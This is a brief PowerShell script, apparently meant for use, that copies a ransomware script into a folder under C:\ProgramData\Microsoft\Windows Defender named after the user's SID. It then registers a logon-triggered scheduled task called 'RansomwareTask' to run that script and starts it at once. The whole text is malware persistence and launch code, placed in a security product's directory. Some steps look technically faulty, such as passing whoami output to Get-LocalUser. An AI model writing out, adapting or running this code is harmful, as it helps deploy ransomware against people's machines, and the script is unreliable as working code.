# Get the current user's SID
$userSID = (Get-LocalUser -Name (whoami)).SID

# Define the path to the Windows Defender folder
$defenderPath = "C:\ProgramData\Microsoft\Windows Defender"

# Create a new folder in the Windows Defender folder for the user
New-Item -Path $defenderPath -Name $userSID -ItemType "directory" -Force

# Copy a script to the user's folder to trigger the ransomware behavior
Copy-Item "C:\ransomware_script.ps1" -Destination "$defenderPath\$userSID\ransomware_script.ps1"

# Define the path to the user's folder
$userFolder = "$defenderPath\$userSID"

# Create a scheduled task to run the ransomware script
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $userFolder\ransomware_script.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet
$principal = New-ScheduledTaskPrincipal -UserId $userSID -LogonType Interactive
Register-ScheduledTask -TaskName "RansomwareTask" -Action $action -Trigger $trigger -Settings $settings -Principal $principal

# Start the scheduled task
Start-ScheduledTask -TaskName "RansomwareTask"
